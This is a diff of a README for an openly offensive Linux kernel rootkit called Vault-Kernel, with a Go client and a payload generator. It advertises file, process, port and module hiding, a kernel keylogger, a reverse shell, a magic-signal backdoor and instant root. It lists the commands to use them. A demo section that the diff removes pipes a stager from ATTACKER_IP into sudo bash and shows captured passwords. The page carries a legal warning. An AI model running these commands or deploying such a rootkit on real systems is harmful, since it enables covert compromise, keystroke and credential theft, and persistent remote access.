@@ -1,81 +1,112 @@
 <p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=rect&color=CC0000&height=100&section=header&text=Vault-Kernel&fontSize=40&fontColor=ffffff&fontAlign=50&fontAlignY=50&animation=fadeIn" alt="header"/>
+  <img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=0,2,3,6,8&height=120&section=header&text=Vault-Kernel&fontSize=50&fontColor=ff4444&animation=twinkling" alt="header"/>
 </p>
 
 <p align="center">
-  <strong>Linux Kernel Rootkit v3.0</strong><br/>
-  <em>Post-exploitation persistence, kernel-level hiding, and root escalation.</em>
+  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&duration=3500&pause=800&color=FF3333&center=true&vCenter=true&repeat=false&width=600&lines=Linux+LKM+Rootkit+Engine;syscall+hooking+%7C+hide+%7C+keylogger+%7C+persistence;red+team+%E2%9C%93+offensive+%F0%9F%9A%80+covert+%F0%9F%95%B7%EF%B8%8F" alt="typing-svg"/>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/C-Kernel-555555?style=for-the-badge&logo=c&logoColor=white" alt="C"/>
-  <img src="https://img.shields.io/badge/Go-Client-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go"/>
-  <img src="https://img.shields.io/badge/version-3.0-red?style=for-the-badge" alt="Version"/>
-  <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="License"/>
-  <img src="https://img.shields.io/badge/kernel-5.4--6.6+-orange?style=for-the-badge" alt="Kernel"/>
+  <img src="https://img.shields.io/badge/Language-C-CC0000?style=for-the-badge&logo=c&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Platform-Linux-FF6600?style=for-the-badge&logo=linux&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Type-LKM-AA0000?style=for-the-badge&logo=linux&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Client-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Kernel-5.4_–_6.12-FF4500?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/License-MIT-1155CC?style=for-the-badge"/>
 </p>
 
 <p align="center">
-  <img src="https://komarev.com/ghpvc/?username=Ruby570bocadito&label=Downloads&color=CC0000&style=flat" alt="downloads"/>
+  <img src="https://img.shields.io/github/v/tag/Ruby570bocadito/Vault-Kernel?style=flat&label=version&color=CC0000"/>
+  <img src="https://img.shields.io/github/last-commit/Ruby570bocadito/Vault-Kernel?style=flat&color=FF4444"/>
+  <img src="https://img.shields.io/github/stars/Ruby570bocadito/Vault-Kernel?style=flat&color=gold"/>
+  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat"/>
 </p>
+
+<br/>
+
+> **⚠️ WARNING — Ético / Legal**
+>
+> Vault-Kernel es **exclusivamente** para auditorías de seguridad autorizadas, entornos controlados de laboratorio, investigación académica y operaciones de red team con **permiso explícito por escrito**.
+>
+> El uso no autorizado de este software puede violar leyes locales e internacionales. El propietario y colaboradores **no se responsabilizan** por el uso indebido. Tú eres el único responsable de cumplir con todas las leyes aplicables.
+>
+> **No hay razón legítima para cargar esto en un sistema que no te pertenece o para el que no tienes autorización.**
+
+<br/>
 
 ---
 
-## 🎯 What is Vault-Kernel?
+## 📐 Arquitectura
 
-**Vault-Kernel** is a Linux kernel rootkit designed for **red team operations** and **security research**. It provides kernel-level process/file/port hiding, a keylogger, reverse shell backdoor, privilege escalation, and self-hiding capabilities — all controlled via a zero-dependency Go CLI.
+```mermaid
+flowchart LR
+    subgraph User["👤 User Space"]
+        CLI["Vault-Kernel CLI<br/>(Go, 0 deps)"]
+        Payload["Payload Generator<br/>(Python)"]
+    end
 
+    subgraph Kernel["🧠 Kernel Space"]
+        LKM["LKM .ko<br/>(C)"]
+        SCT["syscall table<br/>hooking"]
+        WP["WP bypass<br/>(CR0)"]
+        RCU["RCU sync"]
+    end
+
+    subgraph Ops["⚙️ Operations"]
+        FH["file_hide<br/>getdents64"]
+        PH["proc_hide<br/>PID filter"]
+        NH["net_hide<br/>/proc/net/*"]
+        KL["keylogger<br/>notifier chain"]
+        BS["backdoor<br/>reverse shell"]
+        PE["priv_esc<br/>cred edit"]
+        SH["self_hide<br/>lsmod del"]
+    end
+
+    subgraph Device["💾 /dev/Vault-Kernel"]
+        IOC["ioctl interface"]
+    end
+
+    CLI -->|ioctl| Device
+    Payload -->|stager| CLI
+    Device --> LKM
+    LKM --> SCT --> WP
+    SCT --> RCU
+    SCT --> FH
+    SCT --> PH
+    SCT --> NH
+    SCT --> KL
+    SCT --> BS
+    SCT --> PE
+    SCT --> SH
 ```
-┌─────────────────────────────────────────────────────────┐
-│                    Linux Kernel Space                     │
-│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────────┐ │
-│  │ file_hide│ │ proc_hide│ │ net_hide │ │  keylogger  │ │
-│  │ getdents64│ │ PID filter│ │ /proc/net│ │  notifier   │ │
-│  └────┬─────┘ └────┬─────┘ └────┬─────┘ └──────┬──────┘ │
-│       │            │            │               │         │
-│  ┌────┴────────────┴────────────┴───────────────┴──────┐ │
-│  │              syscall_table hooking                   │ │
-│  │              WP bypass + RCU sync                    │ │
-│  └────────────────────────┬────────────────────────────┘ │
-│                           │                              │
-│  ┌────────────────────────┴────────────────────────────┐ │
-│  │              /dev/Vault-Kernel (ioctl)                   │ │
-│  └────────────────────────┬────────────────────────────┘ │
-└───────────────────────────┼──────────────────────────────┘
-                            │
-┌───────────────────────────┼──────────────────────────────┐
-│                    Userland Space                         │
-│  ┌───────────────────────┴──────────────────────────────┐│
-│  │              Vault-Kernel CLI (Go, 0 deps)                ││
-│  │  give-root │ hide-file │ hide-pid │ shell │ keylog   ││
-│  └──────────────────────────────────────────────────────┘│
-└──────────────────────────────────────────────────────────┘
-```
+
+<br/>
 
 ---
 
-## ⚡ Features
+## 🔥 Features
 
-| Feature | Technique | Stealth Level |
-|---------|-----------|---------------|
-| **Hide Files/Directories** | Hook `getdents64`, `openat`, `unlinkat` — invisible to `ls`, `find`, `stat` | 🔴 High |
-| **Hide Processes** | PID filtering in `/proc` — invisible to `ps`, `top`, `htop` | 🔴 High |
-| **Hide Network Ports** | Filter `/proc/net/tcp*` and `/proc/net/udp*` — invisible to `netstat`, `ss` | 🔴 High |
-| **Kernel Keylogger** | Keyboard notifier chain — captures keys before X11/Wayland | 🔴 High |
-| **Reverse Shell** | `call_usermodehelper()` via workqueue — no disk touch, no visible fork | 🔴 High |
-| **Magic Packet Backdoor** | Trigger via `kill()` syscall — no open port required | 🟡 Medium |
-| **Instant Root Escalation** | Direct `cred` manipulation — root any process instantly | 🔴 High |
-| **Hide from lsmod** | `list_del` from module list + `kobject_del` — invisible to `lsmod` | 🔴 High |
-| **Self-Hiding Module** | Removes itself from kernel module list | 🔴 High |
+| Feature | Technique | Stealth |
+|---------|-----------|---------|
+| **Hide Files/Dirs** | Hook `getdents64`, `openat`, `unlinkat` | 🟢 Invisible to `ls`, `find`, `stat` |
+| **Hide Processes** | PID filter in `/proc` read | 🟢 Invisible to `ps`, `top`, `htop` |
+| **Hide Ports** | Filter `/proc/net/tcp*`, `/proc/net/udp*` | 🟢 Invisible to `netstat`, `ss` |
+| **Kernel Keylogger** | Keyboard notifier chain | 🟢 Captures before X11/Wayland |
+| **Reverse Shell** | `call_usermodehelper()` via workqueue | 🟢 No disk touch, no visible fork |
+| **Magic Backdoor** | Trigger via `kill()` syscall | 🟡 No open port required |
+| **Instant Root** | Direct `cred` manipulation | 🟢 Root any PID instantly |
+| **Hide from lsmod** | `list_del` + `kobject_del` | 🟢 Invisible to `lsmod` |
+| **Self-Hiding Module** | Removes from kernel module list | 🟢 Cannot be found after load |
+
+<br/>
 
 ---
 
-## 🚀 Quick Start
+## ⚡ Quick Start
 
 ### Prerequisites
 
 ```bash
-# Build dependencies
 sudo apt install build-essential linux-headers-$(uname -r) golang-go
 ```
 
@@ -102,7 +133,7 @@ sudo ./Vault-Kernel status
 sudo ./Vault-Kernel give-root
 
 # Hide a file from ls/find/stat
-sudo ./Vault-Kernel hide-file mal.sh
+sudo ./Vault-Kernel hide-file malicious.sh
 
 # Hide a process from ps/top
 sudo ./Vault-Kernel hide-pid 1337
@@ -123,125 +154,38 @@ sudo ./Vault-Kernel keylog
 sudo ./Vault-Kernel list
 ```
 
----
-
-## 🎬 Demo
-
-### Full Attack Chain (30 seconds)
-
-```bash
-# Terminal 1 — Attacker
-cd Vault-Kernel/payloads
-python3 payload.py                  # Generate bash_stager.sh
-python3 -m http.server 8080 &       # Serve payload
-nc -lvnp 4444                       # Listener for reverse shell
-
-# Terminal 2 — Target (Linux VM)
-curl -s http://ATTACKER_IP:8080/bash_stager.sh | sudo bash
-```
-
-**Result:** Rootkit compiled → loaded → hidden from `lsmod` → reverse shell active → persistence installed → dropper self-destructs.
-
-### CLI Session
-
-```
-$ sudo ./Vault-Kernel status
-[+] Vault-Kernel module is loaded
-
-$ sudo ./Vault-Kernel give-root
-[+] Root privileges granted to PID 1337
-
-$ sudo ./Vault-Kernel hide-file /tmp/.hidden_malware
-[+] File hidden: /tmp/.hidden_malware
-
-$ sudo ./Vault-Kernel hide-pid 666
-[+] Process hidden: PID 666
-
-$ sudo ./Vault-Kernel hide-port 4444
-[+] Port hidden: 4444/tcp
-
-$ sudo ./Vault-Kernel list
-Hidden files : 1
-Hidden PIDs  : 1
-Hidden ports : 1
-Module hidden: yes
-
-$ sudo ./Vault-Kernel keylog
-Captured: password123[Enter]sudo su[Enter]...
-
-$ sudo ./Vault-Kernel shell 10.0.0.5:1337
-[+] Reverse shell initiated to 10.0.0.5:1337
-```
+<br/>
 
 ---
 
-## 🏗️ Architecture
-
-### Kernel Module (C)
+## 📦 Project Structure
 
 ```
-src/
-├── main.c          init/exit, sys_call_table find, WP bypass
-├── hooking.c       install/remove hooks + RCU sync
-├── file_hide.c     getdents64/getdents/openat/unlinkat hooks
-├── proc_hide.c     PID hiding + kill hook (magic backdoor)
-├── net_hide.c      /proc/net/* filtering via read hook
-├── keylogger.c     keyboard notifier chain
-├── backdoor.c      reverse shell + magic packet trigger
-├── priv_esc.c      give_root via cred manipulation
-├── stealth.c       hide from lsmod + kobject_del
-├── ioctl.c         /dev/Vault-Kernel char device
-├── core.h          headers + ioctl constants
-└── Makefile
+Vault-Kernel/
+├── src/                    # Kernel module (C)
+│   ├── main.c              # init/exit, syscall table find, WP bypass
+│   ├── hooking.c           # install/remove hooks + RCU sync
+│   ├── file_hide.c         # getdents64/getdents/openat/unlinkat hooks
+│   ├── proc_hide.c         # PID hiding + kill hook (magic backdoor)
+│   ├── net_hide.c          # /proc/net/* filtering via read hook
+│   ├── keylogger.c         # keyboard notifier chain
+│   ├── backdoor.c          # reverse shell + magic packet trigger
+│   ├── priv_esc.c          # give-root via cred manipulation
+│   ├── stealth.c           # hide from lsmod + kobject_del
+│   ├── ioctl.c             # /dev/Vault-Kernel char device
+│   ├── core.h              # headers + ioctl constants
+│   └── Makefile
+├── client/go/              # Userland client (Go, zero deps)
+│   ├── cmd/Vault-Kernel/   # 14 commands
+│   └── internal/ioctl/     # ioctl wrapper + 15 unit tests
+├── payloads/               # Payload generator (Python)
+│   ├── payload.py          # Interactive generator (3 formats)
+│   └── builder.sh          # CLI wrapper
+└── tests/                  # Integration tests
+    └── integration.sh
 ```
 
-### Userland Client (Go)
-
-```
-client/go/
-├── cmd/Vault-Kernel/main.go    14 commands, zero dependencies
-└── internal/ioctl/         ioctl wrapper + 15 unit tests
-```
-
-### Payload Generator (Python)
-
-```
-payloads/
-├── payload.py              Interactive generator (3 formats)
-└── builder.sh              CLI wrapper
-```
-
-### Payload Formats
-
-| Format | Size | Dependencies | Persistence | Anti-VM |
-|--------|------|--------------|-------------|---------|
-| **Bash dropper** | ~19KB | gcc required | systemd + rc.local | 5 checks |
-| **Python stager** | ~0.8KB | Python 3 | No | No |
-| **C stager** | ~4KB src → ~15KB bin | libc only | No | sleep guard |
-
-Each payload includes: XOR obfuscation (bash), camouflaged logging (syslog), self-destruct, Firefox User-Agent.
-
----
-
-## 📋 All CLI Commands
-
-```bash
-Vault-Kernel status              # Check if module is loaded
-Vault-Kernel give-root [pid]     # Grant root to a process
-Vault-Kernel hide-file <name>    # Hide file/directory
-Vault-Kernel unhide-file <name>  # Unhide file/directory
-Vault-Kernel hide-pid <pid>      # Hide process
-Vault-Kernel unhide-pid <pid>    # Unhide process
-Vault-Kernel hide-port <port>    # Hide network port
-Vault-Kernel unhide-port <port>  # Unhide network port
-Vault-Kernel list                # List all hidden objects
-Vault-Kernel shell <ip:port>     # Initiate reverse shell
-Vault-Kernel magic <word>        # Activate backdoor without open port
-Vault-Kernel keylog              # Read captured keystrokes
-Vault-Kernel keylog-clear        # Clear keylogger buffer
-Vault-Kernel hide-module         # Hide rootkit from lsmod
-Vault-Kernel unhide-module       # Make module visible again
-```
+<br/>
 
 ---
 
@@ -261,16 +205,21 @@ docker exec -it rooteame-attacker bash
 bash docker/test.sh down          # Cleanup
 ```
 
+<br/>
+
 ---
 
-## 🔧 Kernel Compatibility
+## 🧠 Kernel Compatibility
 
 | Kernel Version | Status | Notes |
 |----------------|--------|-------|
-| **5.4 — 5.6** | ✅ Supported | `kallsyms_lookup_name` exported |
-| **5.7 — 5.x** | ✅ Supported | kprobe fallback |
-| **6.0 — 6.6+** | ✅ Supported | `class_create()` adapted |
+| **5.4 – 5.6** | ✅ Supported | `kallsyms_lookup_name` exported |
+| **5.7 – 5.x** | ✅ Supported | kprobe fallback |
+| **6.0 – 6.6+** | ✅ Supported | `class_create()` adapted |
 | **WSL2** | ❌ Not supported | No kernel headers |
+| **ARM64** | 🚧 Planned | On roadmap |
+
+<br/>
 
 ---
 
@@ -284,19 +233,44 @@ bash docker/test.sh down          # Cleanup
 - [ ] Integration with peekaboo for full attack chain
 - [ ] C2 integration (BTY framework)
 
+<br/>
+
 ---
 
-## ⚠️ Disclaimer
+## 📚 All CLI Commands
 
-This tool is designed for **authorized security testing**, **red team operations**, and **educational purposes** only.
+```bash
+Vault-Kernel status              # Check if module is loaded
+Vault-Kernel give-root [pid]     # Grant root to a process
+Vault-Kernel hide-file <name>    # Hide file/directory
+Vault-Kernel unhide-file <name>  # Unhide file/directory
+Vault-Kernel hide-pid <pid>      # Hide process
+Vault-Kernel unhide-pid <pid>    # Unhide process
+Vault-Kernel hide-port <port>    # Hide network port
+Vault-Kernel unhide-port <port>  # Unhide network port
+Vault-Kernel list                # List all hidden objects
+Vault-Kernel shell <ip:port>     # Initiate reverse shell
+Vault-Kernel magic <word>        # Activate backdoor without open port
+Vault-Kernel keylog              # Read captured keystrokes
+Vault-Kernel keylog-clear        # Clear keylogger buffer
+Vault-Kernel hide-module         # Hide rootkit from lsmod
+Vault-Kernel unhide-module       # Make module visible again
+```
 
-- Use only on systems you own or have explicit written permission to test
-- Kernel-level modifications can cause system instability or crashes
-- Misuse may violate local and international laws
-- The author is not responsible for any misuse or damage caused by this tool
+<br/>
+
+---
+
+## 🤝 Contributing
+
+PRs are welcome. For major changes, open an issue first. Keep everything in the spirit of **authorized security testing education**.
+
+<br/>
 
 ---
 
 <p align="center">
-  <sub>Built with ❤️ by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
+  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
+  <br/>
+  <sub>Vault-Kernel — Linux LKM Rootkit Engine v3.0</sub>
 </p>
